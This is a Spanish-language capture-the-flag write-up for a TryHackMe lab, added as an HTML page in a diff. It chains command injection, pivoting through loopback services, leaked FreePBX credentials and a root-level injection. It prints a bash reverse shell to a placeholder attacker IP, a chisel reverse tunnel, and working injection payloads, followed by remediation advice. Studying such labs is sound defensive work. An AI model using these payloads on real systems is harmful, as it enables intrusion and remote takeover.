@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 11 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Web / Command Injection / Pivoting / Privilege Escalation</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">Critical</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-07</div>
+      </div>
+    </div>
+
+    <h1>Infinity Pool — Command Injection encadenada, pivoting a servicios internos y CVE-2026-46376 en FreePBX UCP</h1>
+    <p class="dek">Cadena de compromiso total en un reto Boot2Root: command injection en una herramienta interna de "conectividad entre propiedades" otorgó una shell inicial, desde la cual se enumeraron servicios expuestos únicamente en loopback. La explotación de credenciales filtradas contra CVE-2026-46376 (FreePBX UCP) permitió acceder a un panel de voicemail que ocultaba una API key, la cual finalmente se usó para una segunda command injection ejecutada como root.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>Un escaneo de puertos inicial reveló únicamente dos servicios expuestos:</p>
+    <pre><code>nmap -sC -sV -p- &lt;IP&gt;
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http (Gunicorn)</code></pre>
+    <p>El servidor identificándose como <strong>Gunicorn</strong> ya sugería una aplicación Python/Flask por detrás. Revisando <code>robots.txt</code> aparecieron dos rutas explícitamente ocultas de indexación:</p>
+    <pre><code>Disallow: /internal/
+Disallow: /status</code></pre>
+    <p>La ruta <code>/status</code> exponía una herramienta de staff llamada <strong>"Sister-property connectivity"</strong>: un formulario que permitía hacer ping a un host ingresado por el usuario, enviando la solicitud vía POST a <code>/internal/netcheck</code>:</p>
+    <pre><code>&lt;form method="post" action="/internal/netcheck" class="tool"&gt;
+  &lt;input type="text" name="host" placeholder="property host e.g. 10.0.0.5" autofocus&gt;
+  &lt;button type="submit"&gt;Check&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>Se identificaron <strong>múltiples vulnerabilidades encadenables</strong> a lo largo de todo el ataque:</p>
+    <ul>
+      <li><strong>Command Injection en <code>/internal/netcheck</code>:</strong> el backend Flask ejecutaba el host ingresado por el usuario directamente dentro de un comando de shell, sin sanitización:
+        <pre><code>proc = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True, timeout=15)</code></pre>
+        La combinación de <code>shell=True</code> con interpolación de f-string es inyección directa. El carácter <code>;</code> estaba filtrado, pero el pipe <code>|</code> no.</li>
+      <li><strong>Exposición de configuración interna vía Watchtower (<code>/api/config</code>):</strong> un servicio de monitoreo en loopback (<code>127.0.0.1:3000</code>) exponía sin autenticación un endpoint que filtraba credenciales del portal de telefonía (FreePBX UCP) en texto plano, incluyendo una nota interna que ya advertía sobre credenciales de template sin rotar.</li>
+      <li><strong>CVE-2026-46376 — FreePBX UCP Hardcoded Credentials:</strong> versiones de FreePBX anteriores a 16.0.45 incluyen un usuario de template hardcodeado (<code>FreePBXUCPTemplateCreator</code>) en el módulo <code>userman</code> (<code>Userman.class.php</code>), con contraseña derivada de un hash predecible. En esta instancia, la credencial real filtrada por Watchtower coincidía con este vector.</li>
+      <li><strong>Información sensible oculta en un mensaje de voicemail:</strong> una API key de un servicio de automatización que corre como root estaba embebida en el campo Caller ID (CID) de un mensaje de voicemail dentro del panel UCP autenticado — un lugar atípico para almacenar un secreto operativo.</li>
+      <li><strong>Segunda Command Injection en <code>/jobs/export</code> (ejecutado como root):</strong> el servicio "Automation" (<code>127.0.0.1:9000</code>) concatenaba el campo <code>report</code> del body sin sanitizar dentro de un comando <code>tar</code>, ejecutado con privilegios de root.</li>
+    </ul>
+
+    <div class="callout"><strong>Nota:</strong> ninguna falla individual bastaba para comprometer el sistema completo. La command injection inicial solo otorgaba una shell de bajo privilegio (<code>web</code>); los servicios internos en loopback no eran alcanzables sin ese foothold; las credenciales de Watchtower requerían encontrar el vector CVE correcto para ser útiles; y la API key de automation estaba oculta en un lugar que solo era visible tras autenticarse en el UCP. El compromiso total dependía de recorrer la cadena completa, sin atajos.</div>
+
+    <h2>Explotación (PoC)</h2>
+
+    <p><strong>Paso 1 — Confirmación de Command Injection.</strong> El carácter <code>;</code> estaba filtrado por el backend, pero no el pipe <code>|</code>:</p>
+    <pre><code>curl -X POST http://&lt;IP&gt;/internal/netcheck --data-urlencode "host=127.0.0.1 | id"</code></pre>
+    <p>La respuesta confirmó ejecución de comandos como el usuario <code>web</code> (uid=1001). Se lanzó una reverse shell reutilizando el mismo vector:</p>
+    <pre><code>curl -X POST http://&lt;IP&gt;/internal/netcheck --data-urlencode "host=127.0.0.1 | bash -c 'bash -i >&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0>&amp;1'"</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day11-reverse-shell.png" alt="Reverse shell recibida como usuario web, estabilizada con pty.spawn">
+      <figcaption>Fig. 1 — Reverse shell recibida en el listener; estabilización de la TTY con <code>pty.spawn</code> y <code>stty raw -echo; fg</code>.</figcaption>
+    </figure>
+
+    <p>Con la shell activa se localizó la user flag:</p>
+    <pre><code>web@tryhackme-2404:~$ cat /home/web/user.txt
+THM{n0_v1s1bl3_3dg3}</code></pre>
+    <div class="callout"><strong>User flag:</strong> <code>THM{n0_v1s1bl3_3dg3}</code></div>
+
+    <p><strong>Paso 2 — Enumeración de servicios internos.</strong> La estructura del proyecto reveló tres componentes con distintos permisos:</p>
+    <pre><code>/var/www/infinity_pool/
+├── edge/          (root:root, world-readable — app pública, corre como "web")
+├── automation/    (root:root, permisos 750 — NO accesible)
+└── watchtower/    (svc-watch:svc-watch, permisos 750 — NO accesible)</code></pre>
+    <p><code>ss -tlnp</code> confirmó varios servicios vinculados únicamente a loopback, invisibles desde el escaneo externo inicial:</p>
+    <pre><code>127.0.0.1:3000  → Watchtower (corre como svc-watch)
+127.0.0.1:9000  → Automation (corre como root)
+127.0.0.1:8080  → FreePBX (Admin + UCP)
+127.0.0.1:5038  → Asterisk Manager Interface (AMI)
+127.0.0.1:3306  → MariaDB</code></pre>
+
+    <p><strong>Paso 3 — Leak de credenciales vía Watchtower.</strong> El endpoint de configuración de Watchtower era accesible sin autenticación desde localhost:</p>
+    <pre><code>curl -s http://127.0.0.1:3000/api/config</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day11-watchtower-page.png" alt="Página HTML de Watchtower mostrando endpoints disponibles: /api/health y /api/config">
+      <figcaption>Fig. 2 — Interfaz de Watchtower ("Surveillance operations"), consola loopback-only, referenciando el endpoint <code>/api/config</code>.</figcaption>
+    </figure>
+
+    <pre><code>{
+  "automation_endpoint": "http://127.0.0.1:9000",
+  "note": "internal network only -- do not expose",
+  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
+  "telephony_pass": "St4yN0t1c3d_2026",
+  "telephony_portal": "http://127.0.0.1:8080/ucp",
+  "telephony_user": "FreePBXUCPTemplateCreator"
+}</code></pre>
+    <p>Además de las credenciales, la respuesta de <code>/health</code> del servicio Automation reveló la existencia de un endpoint privilegiado:</p>
+    <pre><code>{
+  "endpoints": {
+    "GET /health": "service status",
+    "POST /jobs/export": {
+      "auth": "Authorization: Bearer &lt;automation key&gt;",
+      "body": {"report": "&lt;report name&gt;"},
+      "desc": "archive the latest data export"
+    }
+  },
+  "runs_as": "root",
+  "service": "automation"
+}</code></pre>
+
+    <p><strong>Paso 4 — CVE-2026-46376: identificación del vector hardcodeado.</strong> Revisando el código fuente de FreePBX accesible desde la shell (<code>Userman.class.php</code>) se confirmó la existencia del usuario de template <code>FreePBXUCPTemplateCreator</code>, con contraseña generada mediante un hash predecible en el propio módulo <code>userman</code>:</p>
+
+    <figure>
+      <img src="../assets/img/Day11-userman-source.png" alt="Código fuente de Userman.class.php mostrando la generación del usuario de template con md5 hardcodeado">
+      <figcaption>Fig. 3 — Código fuente de <code>Userman.class.php</code>: <code>generateTemplateCreator()</code> construye el usuario de template con una clave derivada de un valor hardcodeado (<code>md5('1a2b3c@fd48jshs03123ld')</code>).</figcaption>
+    </figure>
+
+    <p>La credencial real, post-setup, coincidía con la filtrada por Watchtower (<code>St4yN0t1c3d_2026</code>). Sin embargo, el login del UCP funciona vía JavaScript/AJAX: peticiones <code>curl</code> directas contra el formulario tradicional siempre rebotaban a la página de login, y el endpoint real (<code>/ucp/ajax.php</code>) requería un token CSRF válido servido en sesión:</p>
+    <pre><code>curl -s -X POST http://127.0.0.1:8080/ucp/ajax.php \
+  -d "module=User" -d "command=login" \
+  -d "username=FreePBXUCPTemplateCreator" \
+  -d "password=St4yN0t1c3d_2026"
+
+{"error":"ajaxRequest declined"}</code></pre>
+
+    <p><strong>Paso 5 — Túnel con chisel para usar un navegador real.</strong> En lugar de intentar replicar manualmente el manejo de CSRF y cookies, se estableció un túnel reverso con <strong>chisel</strong> para exponer los puertos internos en la máquina atacante y navegar contra ellos con un navegador real:</p>
+    <pre><code># Atacante (Kali)
+chisel server -p 9999 --reverse
+
+# Víctima (como "web")
+./chisel client &lt;ATTACKER_IP&gt;:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000</code></pre>
+    <p>Con el túnel activo, se accedió desde Firefox en Kali a <code>http://127.0.0.1:8080/ucp/</code>, permitiendo que el JavaScript de la página gestionara correctamente el token CSRF y las cookies de sesión. El login con las credenciales filtradas fue exitoso:</p>
+    <pre><code>Usuario: FreePBXUCPTemplateCreator
+Password: St4yN0t1c3d_2026</code></pre>
+
+    <p><strong>Paso 6 — La key oculta en un voicemail.</strong> Dentro del UCP autenticado se agregó el widget de Voicemail al dashboard. El inbox mostraba un único mensaje cuyo campo <strong>Caller ID (CID)</strong> — no el cuerpo del mensaje ni un archivo adjunto — contenía la Bearer key del servicio de Automation:</p>
+    <pre><code>"Automation Key cc_auto_7b3f9a1c4e0d2f6a" &lt;9000&gt;</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day11-voicemail-key.png" alt="Panel de voicemail del UCP mostrando la Automation Key en el campo Caller ID">
+      <figcaption>Fig. 4 — Panel de voicemail en el UCP autenticado: el campo CID del único mensaje en INBOX contiene la Bearer key del servicio Automation.</figcaption>
+    </figure>
+
+    <p><strong>Paso 7 — Segunda Command Injection, esta vez como root.</strong> Con la key en mano, se confirmó el acceso al endpoint <code>/jobs/export</code>:</p>
+    <pre><code>curl -s -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
+  -H "Content-Type: application/json" \
+  -d '{"report":"test"}'</code></pre>
+    <p>La respuesta ecoaba el comando shell construido internamente por el servicio, revelando la falta de sanitización:</p>
+    <pre><code>{"command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&amp;1", ...}</code></pre>
+    <p>El campo <code>report</code> se concatenaba directamente dentro de un <code>tar czf &lt;report&gt; /var/automation/data</code> ejecutado como root. Cerrando el argumento e inyectando un comando propio se logró leer la root flag:</p>
+    <pre><code>curl -s -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
+  -H "Content-Type: application/json" \
+  -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
+
+{"command":"tar czf /var/automation/exports/x.tgz /var/automation/data; cat /root/root.txt #.tgz /var/automation/data 2>&amp;1","output":"THM{tr4c3d_t0_th3_h0r1z0n}\ntar: Removing leading `/' from member names\n"}</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day11-root-injection.png" alt="Terminal mostrando la segunda command injection contra /jobs/export revelando la root flag">
+      <figcaption>Fig. 5 — Command injection en <code>/jobs/export</code> autenticada con la Bearer key filtrada, revelando la root flag en la respuesta JSON.</figcaption>
+    </figure>
+
+    <div class="callout"><strong>Root flag:</strong> <code>THM{tr4c3d_t0_th3_h0r1z0n}</code></div>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La cadena completa resultó en compromiso total del sistema, sin necesidad de credenciales SSH ni acceso físico:</p>
+    <ul>
+      <li><strong>Foothold inicial</strong> como usuario <code>web</code> mediante command injection sin autenticación previa en una herramienta de staff mal expuesta.</li>
+      <li><strong>Descubrimiento de infraestructura interna</strong> (Watchtower, Automation, FreePBX, AMI, MariaDB) invisible desde el exterior, alcanzable solo tras el foothold.</li>
+      <li><strong>Explotación de un CVE conocido</strong> (CVE-2026-46376) usando credenciales filtradas por un servicio de monitoreo interno sin autenticación.</li>
+      <li><strong>Extracción de un secreto operativo</strong> almacenado en un lugar atípico (campo CID de un voicemail) dentro de un panel autenticado.</li>
+      <li><strong>Ejecución remota de código como root</strong> mediante una segunda command injection, estructuralmente idéntica a la primera, en un endpoint protegido solo por una API key.</li>
+    </ul>
+    <p>El impacto es <em>critical</em>: un atacante sin cuenta previa puede pasar de una herramienta pública de "ping a otra propiedad" a ejecución de comandos como root, atravesando cinco componentes internos distintos. En un entorno real esto equivale a compromiso total de la infraestructura de telefonía y automatización del resort, incluyendo la base de datos de FreePBX y cualquier dato procesado por los jobs de exportación.</p>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Nunca ejecutar input de usuario con <code>shell=True</code>:</strong> usar <code>subprocess.run([...], shell=False)</code> con una lista de argumentos explícita, o validar el input contra una whitelist estricta (por ejemplo, un regex de IP/hostname) antes de cualquier interpolación. Esto aplica tanto al endpoint de ping inicial como al de exportación en Automation — el mismo patrón se repitió dos veces.</li>
+      <li><strong>No filtrar caracteres de forma incompleta:</strong> bloquear solo <code>;</code> sin considerar <code>|</code>, <code>&amp;&amp;</code>, backticks o <code>$()</code> no mitiga la inyección de comandos, solo la dificulta superficialmente.</li>
+      <li><strong>Autenticar todos los servicios internos, incluso en loopback:</strong> un servicio alcanzable solo desde <code>127.0.0.1</code> deja de ser "seguro por posición" en cuanto un atacante obtiene cualquier foothold en el host. Watchtower y Automation deberían requerir autenticación independientemente de su exposición de red.</li>
+      <li><strong>Actualizar FreePBX a una versión sin el vector de CVE-2026-46376</strong> (16.0.45 o superior) y rotar cualquier credencial de template generada con el esquema hardcodeado, tal como advertía la propia nota interna filtrada.</li>
+      <li><strong>No almacenar secretos operativos en campos de datos no diseñados para eso</strong> (como un Caller ID de voicemail). Usar un gestor de secretos dedicado con control de acceso y auditoría.</li>
+      <li><strong>Rotar y limitar el alcance de API keys de servicios privilegiados:</strong> una key que autoriza ejecución de comandos como root en un servicio de automatización debería, como mínimo, limitar estrictamente los valores aceptados en parámetros como <code>report</code> (por ejemplo, solo un nombre de archivo sin espacios ni metacaracteres de shell).</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto es un ejemplo extenso de cómo una sola clase de vulnerabilidad —command injection por <code>shell=True</code> con input sin sanitizar— puede aparecer dos veces en la misma cadena de ataque, en componentes completamente distintos (una herramienta pública de staff y un servicio interno de automatización), y ser el eslabón que abre tanto el foothold inicial como la escalada final a root.</p>
+    <p>También refuerza que los servicios "solo accesibles por loopback" no son una medida de seguridad por sí sola: en cuanto existe cualquier ejecución de código en el host, esos servicios pasan a ser tan alcanzables como cualquier otro, y deben enumerarse y auditarse con el mismo criterio.</p>
+    <p>Un aprendizaje operacional importante fue saber <strong>cuándo dejar de pelear contra <code>curl</code></strong>: el login del UCP dependía de JavaScript del lado del cliente para manejar tokens CSRF correctamente, y replicar ese comportamiento manualmente resultó menos eficiente que tunelar un navegador real con <code>chisel</code>. Por último, la ubicación de la Automation Key —en el campo CID de un mensaje de voicemail— es un recordatorio de que la información sensible en sistemas reales no siempre aparece donde uno la busca primero; vale la pena revisar cada superficie de datos disponible tras autenticarse, no solo los lugares "obvios".</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
